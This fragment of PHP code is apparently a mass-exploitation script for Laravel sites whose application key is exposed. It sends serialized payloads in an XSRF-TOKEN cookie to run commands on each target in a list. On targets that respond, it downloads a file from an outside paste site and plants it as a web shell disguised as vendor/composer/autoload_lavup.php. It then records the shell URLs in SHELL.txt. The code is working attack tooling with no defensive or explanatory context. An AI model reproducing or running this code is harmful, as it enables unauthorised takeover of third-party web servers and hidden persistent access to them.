...
class Func_
{
    ...
    public function GeneratePayload($command, $func = "passthru", $method = 1)
    {
        $payload = null;
        $p = "<?php $command exit; ?>";
        switch ($method)
...
foreach($read as $cok) {
    ...
    if (!empty($wibu->app_key) || $wibu->app_key != null) {
        ...
        $payload = $func->GeneratePayload("echo base64_decode('{$payload}');", 'passthru', 5);
        ...
        if (preg_match('/_ALL_WE_KNOW_/', $bre->body)) {
            echo $cok . " ===> ";
            $payload = $func->GeneratePayload('$c = $_SERVER["DOCUMENT_ROOT"]."/vendor/composer/autoload_lavup.php"; copy("https://0paste.com/94427.txt", $c); echo "h3ll0w0rd";', "passthru", 5);
            $serialize = $func->Serialize($app, $payload);
            $header = array(
                'Cookie: XSRF-TOKEN=' . $serialize
            );
            $bro = $req->Requests($cok, null, $header, false);
            if (preg_match('/h3ll0w0rd/', $bro->body)) {
                $njir = $req->Requests($cok . "/vendor/composer/autoload_lavup.php", null, null, false);
                if (preg_match('/azzatssins/', $njir->body)) {
                    echo 'SHELL OK ===> ' . $cok . '/vendor/composer/autoload_lavup.php' . PHP_EOL;
                    Save('SHELL.txt', $cok . '/vendor/composer/autoload_lavup.php');
                } else {
